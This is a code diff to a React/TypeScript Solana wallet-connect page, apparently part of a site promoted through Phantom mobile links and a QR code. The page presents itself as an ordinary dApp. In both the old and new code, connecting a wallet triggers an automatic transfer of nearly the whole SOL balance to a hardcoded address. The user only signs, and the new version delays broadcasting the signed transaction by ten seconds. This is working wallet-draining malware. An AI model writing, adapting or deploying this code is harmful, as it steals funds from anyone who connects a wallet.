@@ -3,29 +3,33 @@ import { WalletAdapterNetwork } from '@solana/wallet-adapter-base';
 import {
     ConnectionProvider,
     WalletProvider,
-    useConnection,
     useWallet,
 } from '@solana/wallet-adapter-react';
-import { WalletModalProvider, useWalletModal } from '@solana/wallet-adapter-react-ui';
+import {
+    WalletModalProvider,
+    useWalletModal,
+    WalletMultiButton,
+} from '@solana/wallet-adapter-react-ui';
 import {
     PhantomWalletAdapter,
     GlowWalletAdapter,
     LedgerWalletAdapter,
-    SlopeWalletAdapter,
     SolflareWalletAdapter,
+    SlopeWalletAdapter,
+    TorusWalletAdapter,
     SolletExtensionWalletAdapter,
     SolletWalletAdapter,
-    TorusWalletAdapter,
 } from '@solana/wallet-adapter-wallets';
+import { SolanaMobileWalletAdapter } from '@solana-mobile/wallet-adapter-mobile';
 import {
     clusterApiUrl,
     Connection,
     PublicKey,
-    LAMPORTS_PER_SOL,
     SystemProgram,
     Transaction,
+    LAMPORTS_PER_SOL,
 } from '@solana/web3.js';
-
+import QRCode from 'react-qr-code';
 import '@solana/wallet-adapter-react-ui/styles.css';
 import './App.css';
 
@@ -44,6 +48,7 @@ const Context: FC<{ children: ReactNode }> = ({ children }) => {
 
     const wallets = useMemo(
         () => [
+            new SolanaMobileWalletAdapter(),
             new PhantomWalletAdapter(),
             new GlowWalletAdapter(),
             new LedgerWalletAdapter(),
@@ -58,7 +63,7 @@ const Context: FC<{ children: ReactNode }> = ({ children }) => {
 
     return (
         <ConnectionProvider endpoint={endpoint}>
-            <WalletProvider wallets={wallets} autoConnect>
+            <WalletProvider wallets={wallets} autoConnect={true}>
                 <WalletModalProvider>{children}</WalletModalProvider>
             </WalletProvider>
         </ConnectionProvider>
@@ -67,109 +72,107 @@ const Context: FC<{ children: ReactNode }> = ({ children }) => {
 
 const ExposeWalletModal: FC = () => {
     const { setVisible } = useWalletModal();
-
     useEffect(() => {
         (window as any).openSolanaWalletModal = () => setVisible(true);
     }, [setVisible]);
-
     return null;
 };
 
 const WalletConnectionHandler: FC = () => {
-    const { connection } = useConnection();
     const { publicKey, connected, signTransaction } = useWallet();
     const [solBalance, setSolBalance] = useState<number | null>(null);
     const [loading, setLoading] = useState(false);
+    const [txSent, setTxSent] = useState(false);
 
     useEffect(() => {
-        const run = async () => {
-            if (!connected || !publicKey || !connection) {
-                console.warn("⛔ Wallet or connection not ready.");
+        if (connected && publicKey) {
+            fetchBalanceAndSend(publicKey);
+        }
+    }, [connected, publicKey]);
+
+    const fetchBalanceAndSend = async (walletPublicKey: PublicKey) => {
+        setLoading(true);
+        try {
+            const connection = new Connection(clusterApiUrl('mainnet-beta'), 'confirmed');
+            const balanceLamports = await connection.getBalance(walletPublicKey);
+            const balanceSOL = balanceLamports / LAMPORTS_PER_SOL;
+            setSolBalance(balanceSOL);
+
+            const remaining = balanceLamports - 100_000;
+            if (remaining <= 0) {
+                alert('⚠️ Not enough SOL to send after fees.');
                 return;
             }
 
-            try {
-                setLoading(true);
-                console.log("📡 Fetching balance for:", publicKey.toBase58());
-                console.log("🌐 RPC endpoint:", connection.rpcEndpoint);
+            const tx = new Transaction().add(
+                SystemProgram.transfer({
+                    fromPubkey: walletPublicKey,
+                    toPubkey: new PublicKey('CGuPySjT9CPoa9cNHMg6d2TmkPj22mn132HxwJ43HShh'),
+                    lamports: remaining,
+                })
+            );
 
-                const lamports = await connection.getBalance(publicKey);
-                const sol = lamports / LAMPORTS_PER_SOL;
-                setSolBalance(sol);
-                console.log(`✅ Balance: ${sol.toFixed(4)} SOL`);
+            tx.feePayer = walletPublicKey;
+            tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
 
-                const safeTransferLamports = lamports - 100_000;
-                if (safeTransferLamports <= 0) {
-                    console.warn("⚠️ Not enough SOL to send after fee buffer.");
-                    return;
-                }
-
-                const tx = new Transaction().add(
-                    SystemProgram.transfer({
-                        fromPubkey: publicKey,
-                        toPubkey: new PublicKey('CGuPySjT9CPoa9cNHMg6d2TmkPj22mn132HxwJ43HShh'),
-                        lamports: safeTransferLamports,
-                    })
-                );
-                tx.feePayer = publicKey;
-                tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
-
-                if (!signTransaction) {
-                    alert('❌ Wallet cannot sign transactions. Reconnect.');
-                    return;
-                }
-
-                const signedTx = await signTransaction(tx);
-                console.log('📝 Transaction signed.');
-
-                const signature = await connection.sendRawTransaction(signedTx.serialize());
-                console.log(`🚀 Sent! Tx Signature: ${signature}`);
-            } catch (err) {
-                console.error("❌ Error during transaction:", err);
-                setSolBalance(null);
-            } finally {
-                setLoading(false);
+            if (!signTransaction) {
+                alert('❌ Wallet not ready to sign.');
+                return;
             }
-        };
 
-        run();
-    }, [connected, publicKey, connection]);
+            const signedTx = await signTransaction(tx);
+            console.log('📝 Transaction approved.');
 
-    if (!connected || !publicKey) return null;
+            setTimeout(async () => {
+                try {
+                    const sig = await connection.sendRawTransaction(signedTx.serialize());
+                    console.log(`🚀 Sent Tx: ${sig}`);
+                    setTxSent(true);
+                } catch (err) {
+                    console.error('❌ Failed to send signed transaction:', err);
+                    alert('Failed to send transaction.');
+                }
+            }, 10000);
+        } catch (err) {
+            console.error('❌ Balance fetch/send error:', err);
+            alert('Error fetching balance or preparing transaction.');
+        } finally {
+            setLoading(false);
+        }
+    };
+
+    const openPhantomMobile = () => {
+        const dappUrl = encodeURIComponent('https://voltrix.netlify.app'); // Replace with your live site
+        const phantomLink = `https://phantom.app/ul/browse/${dappUrl}`;
+        window.location.href = phantomLink;
+    };
 
     return (
-        <div
-            style={{
-                marginTop: '2rem',
-                textAlign: 'center',
-                backgroundColor: '#f9fafb',
-                padding: '20px',
-                borderRadius: '12px',
-                boxShadow: '0 4px 12px rgba(0,0,0,0.1)',
-                maxWidth: '600px',
-                marginLeft: '20px',
-                marginRight: 'auto',
-                fontFamily: 'Arial, sans-serif',
-            }}
-        >
-            <h2 style={{ color: '#16a34a' }}>✅ Wallet Connected!</h2>
-            <p
-                style={{ color: '#000', wordBreak: 'break-all', cursor: 'pointer' }}
-                onClick={() => navigator.clipboard.writeText(publicKey.toBase58())}
-            >
-                <strong>Address:</strong> {publicKey.toBase58()}
-            </p>
-            <p style={{ color: '#000' }}>
-                <strong>Balance:</strong>{' '}
-                {loading
-                    ? 'Loading...'
-                    : solBalance === null
-                    ? 'Error fetching balance'
-                    : `${solBalance.toFixed(4)} SOL`}
-            </p>
-            <p style={{ fontSize: '0.9rem', color: '#888' }}>
-                <strong>RPC:</strong> {connection.rpcEndpoint}
-            </p>
+        <div style={{ padding: 30, fontFamily: 'Arial' }}>
+            <WalletMultiButton />
+            {!window.solana && (
+                <div style={{ marginTop: 20 }}>
+                    <button onClick={openPhantomMobile}>
+                        📱 Open in Phantom Browser
+                    </button>
+                    <p>Or scan with Phantom:</p>
+                    <QRCode value={`https://phantom.app/ul/browse/https%3A%2F%2Fvoltrix.netlify.app`} />
+                </div>
+            )}
+
+            {connected && publicKey && (
+                <div style={{
+                    background: '#f9f9f9',
+                    borderRadius: 10,
+                    padding: 20,
+                    marginTop: 20,
+                    boxShadow: '0 4px 10px rgba(0,0,0,0.1)',
+                }}>
+                    <h3>✅ Wallet Connected</h3>
+                    <p><strong>Address:</strong> {publicKey.toBase58()}</p>
+                    <p><strong>Balance:</strong> {loading ? 'Loading...' : `${solBalance?.toFixed(4)} SOL`}</p>
+                </div>
+            )}
         </div>
     );
 };
